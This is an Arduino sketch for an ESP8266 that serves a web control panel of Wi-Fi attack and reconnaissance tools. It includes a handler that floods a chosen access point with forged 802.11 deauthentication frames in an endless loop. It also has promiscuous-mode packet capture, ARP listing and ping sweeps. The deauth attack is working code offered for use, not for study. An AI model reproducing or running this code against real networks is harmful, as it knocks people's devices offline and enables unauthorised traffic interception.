extern "C" {
  #include <user_interface.h>
}

#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <lwip/etharp.h>
#include <ESP8266Ping.h>

// AP Credentials
const char* ap_ssid = "ESP8266";
const char* ap_password = "1234567890";

// Start HTTP Server
ESP8266WebServer server(80);

// Deauth Variables
String targetSSID = "";
int targetChannel = 1;
uint8_t targetMac[6];

// SSID and Pass to Connect a AP
String ssid;
String password;

// PingScan Conf
IPAddress startIP(192, 168, 0, 1);
IPAddress endIP(192, 168, 0, 254);

String scanResult;

// AP Settings
void setupAP() {
  Serial.println("Starting AP...");
  WiFi.softAP(ap_ssid, ap_password);

  // HTTP Server Routes
  server.on("/", handleRoot);
  server.on("/wifi", handleWifiConnectScan);
  server.on("/scanner", handleWifiScanner);
  server.on("/deauth", handleAttackDeauth);
  server.on("/arp", handleARP);
  server.on("/cap", capture);
  server.on("/pingscan", handlePingScan);
  server.on("/pingscan-interval", handleSetInterval);
  server.on("/pingscan-submit-interval", handleSubmitInterval);
  server.on("/select-wifi", handleWifiScanSelect);
  server.on("/connect", handleWifiConnect);
  server.begin();


  Serial.println("HTTP Server Started...");
}

// Root Page Confis
void handleRoot() {
  String htmlRoot = "<html><head><title>ESP8266 | Root</title><style>html {background-color: black;color: purple;display: flex;}a {color: red;}</style></head><body><h1>Esp8266 : Settings</h1><h2>Pages : </h2><a href='/wifi'>AP Connection</a><br><a href='/scanner'>AP Scanner</a><br><a href='/arp'>ARP Scanner</a><br><a href='/cap'>Capture</a><br><a href='/pingscan'>Ping Scan</a><br><a href='pingscan-interval'>IP Interval</a></body></html>";
  server.send(200, "text/html", htmlRoot);
}


// Handle da pagina de conexão wifi
void handleWifiConnectScan() {
  String page = "<html><head><title>ESP8266 | WiFi</title><style>html{background-color: black; color: purple;}a{color:red}</style></head><body><h1>Close APs:</h1><ul>";
    int numNetworks = WiFi.scanNetworks();
    for (int i = 0; i < numNetworks; i++) {
      page += "<li><a href='/select-wifi?ssid=" + WiFi.SSID(i) + "'>" + WiFi.SSID(i) + "</a></li>";

    }
    page += "</ul></body></html>";
    server.send(200, "text/html", page);
}

void handleWifiScanSelect() {
  if (server.hasArg("ssid")) {
    ssid = server.arg("ssid");
    String page = "<html><head><title>ESP8266 | WiFi Pass</title><style>html{background-color: black; color: purple;}a{color:red}</style></head><body><h1>Connect to " + ssid + "</h1>";
    page += "<form action='/connect' method='POST'>";
    page += "Pass: <input type='password' name='password'><br>";
    page += "<input type='submit' value='Connect'></form></body></html>";
    server.send(200, "text/html", page);
  }
}

void handleWifiConnect() {
  if (server.hasArg("password")) {
    password = server.arg("password");
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    WiFi.begin(ssid.c_str(), password.c_str());

    int attempts = 0;

    while (WiFi.status() != WL_CONNECTED && attempts < 20) {
      delay(500);
      Serial.print(".");
      attempts++;
    }

    if (WiFi.status() == WL_CONNECTED) {
      Serial.println("Connected");
      Serial.print("IP : ");
      Serial.println(WiFi.localIP());
      startWebServer();
    } else {
      Serial.println("Fail on Connection");
      setupAP();
    }

    server.send(200, "text/html", "<html><body><h1>Connecting...</h1></body></html>");
  }
}

// Start/Restart HTTP server
void startWebServer() {
  server.on("/", []() {
    server.send(200, "text/html", "<h1>Connected to AP!</h1>");
  });
  server.begin();
  Serial.println("HTTP Server Started!");
}

// Wifi Scanner Handle
void handleWifiScanner() {
  int numNetworks = WiFi.scanNetworks();
  String htmlScan = "<html><head><title>Esp8266 | AP Scan</title><style>html {background-color: black;color: purple;}a {color: red;}</style></head><body><h1>Close APs</h1><ul>";

  for (int i = 0; i < numNetworks; i++) {
    htmlScan += "<li><a href='/deauth?ssid=" + WiFi.SSID(i) + "&channel=" + String(WiFi.channel(i)) + "&mac=" + WiFi.BSSIDstr(i) + "'>" + WiFi.SSID(i) +" (Channel " + String(WiFi.channel(i)) + ")</a></li>";
  }

  htmlScan += "</ul></body></html>";

  server.send(200, "text/html", htmlScan);
}

// ARP Page Conf
void handleARP() {
  String htmlArp = "<html><head><title>Esp8266 | ARP</title><style>html {background-color: black;color: purple;}</style></head><body>";
  htmlArp += "<h1>Connected Devices : </h1><table border='1'><tr><th>IPv4</th><th>MAC Address</th></tr>";

  size_t i = 0;
  ip4_addr_t *ipaddr;
  struct netif *netif;
  struct eth_addr *eth_ret;

  // Loop to Verify Connected Devices
  while (etharp_get_entry(i, &ipaddr, &netif, &eth_ret) == 1) {
    if (ipaddr != NULL && eth_ret != NULL) {
      htmlArp += "<tr><td>";
      htmlArp += IPAddress(ipaddr->addr).toString();
      htmlArp += "</td><td>";
      htmlArp += formatMacAddress(eth_ret->addr);
      htmlArp += "</td></tr>";
    }
    i++;
  }

  htmlArp += "</table></body></html>";

  server.send(200, "text/html", htmlArp);
}

// Deauth function1
void deauthAttack(uint8_t *targetMac) {
  while (1) {
    sendDeauthFrame(targetMac);
    delay(5);
  }
}

// Deauth function2
void sendDeauthFrame(uint8_t *targetMac) {
  uint8_t deauthPacket[] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    targetMac[0], targetMac[1], targetMac[2],
    targetMac[3], targetMac[4], targetMac[5],
    targetMac[0], targetMac[1], targetMac[2],
    targetMac[3], targetMac[4], targetMac[5],
    0x00, 0x00,
    0x01, 0x00
  };
  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(0);
  wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
}

// Deauth function3
void handleAttackDeauth() {
  if (server.hasArg("ssid") && server.hasArg("channel") && server.hasArg("mac")) {
    targetSSID = server.arg("ssid");
    targetChannel = server.arg("channel").toInt();
    String macStr = server.arg("mac");

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();

    sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &targetMac[0], &targetMac[1], &targetMac[2], &targetMac[3], &targetMac[4], &targetMac[5]);

    wifi_set_channel(targetChannel);
    deauthAttack(targetMac);

    server.send(200, "text/html", "<html><body><h1>Attacking : " + targetSSID + "</h1></body></html>");
  } else {
    server.send(400, "text/html", "Invalid Params");
  }
}

// Format MAC
String formatMacAddress(uint8_t *mac) {
  String macStr = "";
  for (int i = 0; i < 6; i++) {
    if (mac[i] < 0x10) {
      macStr += "0";
    }
    macStr += String(mac[i], HEX);
    if (i < 5) {
      macStr += ":";
    }
  }
  return macStr;
}

// Capture Conf
void capture() {
  if (WiFi.status() == WL_CONNECTED) {
    wifi_promiscuous_enable(1);
    wifi_set_promiscuous_rx_cb([](uint8_t *buf, uint16_t len) {
            for (int i = 0; i < len; i++) {
              Serial.printf("%02X ", buf[i]);
              if ((i + 1) % 16 == 0) {
                Serial.println();
              }
            }
            Serial.println("\n");
            Serial.print("Package Captured - Length : ");
            Serial.print(len);
            Serial.println(" bytes");
            Serial.println("\n");
        });

    Serial.println("Promiscuous mode Activated. Capturing Packages...");
    server.send(200, "text/html", "<html><body>Capture Mode Activated!</body></html>");
  } else {
    server.send(400, "text/html", "<html><body>Conect a AP before use Capture Function</body></html>");
  }
}

// IP Interval Handle
void handleSetInterval() {
  String htmlSetInterval = "<!DOCTYPE html><html><head><style>html{background-color:black;color:purple;}a{color:red}</style><title>Esp826 | Ping Scan Interval</title></head><body>";
  htmlSetInterval += "<h1>Definir Intervalo de IP</h1>";
  htmlSetInterval += "<form action=\"/pingscan-submit-interval\" method=\"POST\">";
  htmlSetInterval += "IP Start : <input type=\"Text\" name=\"startIP\" value=\"" + startIP.toString() + "\"><br>";
  htmlSetInterval += "IP End : <input type=\"text\" name=\"endIP\" value=\"" + endIP.toString() + "\"><br>";
  htmlSetInterval += "<input type=\"submit\" value=\"Save\">";
  htmlSetInterval += "</form>";
  htmlSetInterval += "<p><a href=\"/\">Back</a></p>";
  htmlSetInterval += "</body></html>";

  server.send(200, "text/html", htmlSetInterval);
}

// Submit Interval Handle
void handleSubmitInterval() {
  if (server.hasArg("startIP") && server.hasArg("endIP")) {
    String startIPStr = server.arg("startIP");
    String endIPStr = server.arg("endIP");

    if (startIP.fromString(startIPStr) && endIP.fromString(endIPStr)) {
      server.send(200, "text/html", "<h1>Interval Updated</h1><p><a href=\"/\">Back</a></p>");
      return;
    }
  }
  server.send(400, "text/html", "<h1>Error</h1><p>Interval Error!</p><p><a href=\"/\">Back</a></p>");
}

void handlePingScan() {
  scanResult = "<head><title>Esp8266 | Ping Result</title><style>html{background-color:black;color:purple;}a{color:red;}</style></head><h2>Ping Scan Results:</h2><ul>";
  for (uint8_t i = startIP[3]; i <= endIP[3]; i++) {
    IPAddress targetIP = startIP;
    targetIP[3] = i;

    if (Ping.ping(targetIP, 1)) {
      scanResult += "<li>Device at : " + targetIP.toString() + "</li>";
      Serial.println("Device At : " + targetIP.toString());
    } else {
      // Show No Pong Devices
      // Uncoment if You Want
      // scanResult += "<li>No Response : " + targetIP.toString() + "</li>";
    }
    delay(100);
  }
  scanResult += "</ul>";
  server.send(200, "text/html", scanResult);
}

void setup() {
  Serial.begin(115200);
  setupAP();
}

void loop() {
  server.handleClient();
}